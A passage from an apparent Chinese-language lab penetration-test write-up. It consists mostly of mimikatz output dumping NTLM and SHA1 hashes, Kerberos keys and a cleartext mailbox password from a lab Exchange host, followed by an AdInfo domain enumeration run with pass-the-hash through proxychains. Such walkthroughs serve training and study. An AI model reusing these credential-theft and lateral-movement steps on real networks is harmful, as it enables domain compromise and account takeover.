363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2055331 (00000000:001f5ca3)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 21:29:19</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 54b9b7f7d72149ce94d195bd21b3b558</span><br><span class="line">         * SHA1     : a8074e28f31f64266988f668ca2f670fe3adeae4</span><br><span class="line">         * DPAPI    : 0a5dd0e1f966979ef522bb3af67da6ab</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:48</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 106641 (00000000:0001a091)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 21:27:48</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 66055 (00000000:00010207)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:47</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 9587463cfa3fd1ea760c401e2c52e224</span><br><span class="line">         * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:30</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xiaorang-exc01$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10583441 (00000000:00a17d91)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : oceanzbz</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/9 22:22:57</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line">         * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : oceanzbz</span><br><span class="line">         * Domain   : XIAORANG-EXC01</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9198026 (00000000:008c59ca)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 22:08:29</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 35bfe7dfd4d17ac2818d87cbf05c329f</span><br><span class="line">         * SHA1     : 6c6b68b0387fbdb4d31817b66622cfca76336150</span><br><span class="line">         * DPAPI    : a19236c444273572ec37702b84933168</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2234780 (00000000:0022199c)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 21:29:27</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2184956 (00000000:002156fc)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:29:26</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1741260 (00000000:001a91cc)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 21:29:08</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 54b9b7f7d72149ce94d195bd21b3b558</span><br><span class="line">         * SHA1     : a8074e28f31f64266988f668ca2f670fe3adeae4</span><br><span class="line">         * DPAPI    : 0a5dd0e1f966979ef522bb3af67da6ab</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : HealthMailbox0d5918e</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 101478 (00000000:00018c66)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/9 21:27:48</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Zhangtong</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 65909 (00000000:00010175)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:47</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:46</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xiaorang-exc01$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10576178 (00000000:00a16132)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 22:22:56</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9289472 (00000000:008dbf00)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 22:11:07</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 9a 30 92 5b 2a fb 5d 29 d2 12 a6 4a 70 db c1 33 ac 37 32 35 c2 07 c5 ca 76 d5 5f 1b 3c 32 d6 49 4c 3d 96 49 08 ae 65 d4 55 3d f7 28 34 94 4a c5 5a 2f a9 6a 0b a9 5b 79 66 90 03 9b dd 13 8e 7b 9b 68 bb 69 63 4e 6c da fa d5 e1 45 58 74 67 c0 01 29 8a 0b 85 b6 6e ac 16 77 43 a6 9a d0 49 80 df 5d 93 93 68 7d e3 a9 31 90 e3 70 07 f9 ff d6 37 df 49 c0 d7 1e 63 f8 10 8b 9b 08 1e 66 f0 f3 fb 4a 23 ca 1d 4c 49 fb e1 22 3c ae b2 c3 ac 17 72 b7 93 75 97 56 b9 0b 90 2f da 74 a0 14 cd 5c 70 e6 19 68 4a cc 7a c0 81 e2 42 8e 5f 61 2d 92 d8 5f 85 fb 66 f0 75 dc db 0f 37 ff 7b af e6 6e 5a bf 7c 55 7d 68 6f d0 54 8c 7c 01 53 08 df d6 2f 79 de 1d ff f8 b4 c8 e7 65 97 6a 50 e1 f2 ff 9b 20 07 4f 46 5e a2 be 22 f2 9f 52 5b cb 96 1b</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:47</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 23855 (00000000:00005d2f)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/9 21:27:31</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XIAORANG-EXC01$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">         * SHA1     : 363817478dded0d6035495698eaefe685f0f2bea</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">         [00000000]</span><br><span class="line">         * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : )3Pl^NVXHRp^le]I8e)NBzHZ3oMjlB#D0[WY&#123;2_YZ^/Y)])Be7Fk2F-![En&#123;YxSQHEx^)P5Tdql#%]b+zOWB2OD.J2S5&#123;of7Eh@QUQTOn?2ULKZypB*m1bZb.%:n5&amp;%v</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p>主要用的就是 用户Zhangtong 的hash还有机器用户的hash，先用Adinfo收集下域内的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.3.2&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  47.92.4.8:1236  ...  172.22.3.2:389  ...  OK</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: XIAORANG-EXC01$</span><br><span class="line">[c] Auth hash: 2fe63e7825e4ed728e70f830881b5585</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system </span><br><span class="line">[i] Domain SID: </span><br><span class="line">                    [+] S-1-5-21-533686307-2117412543-4200729784</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10 </span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 10675199(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] XIAORANG-WIN16$  ==&gt;&gt;&gt;   Windows 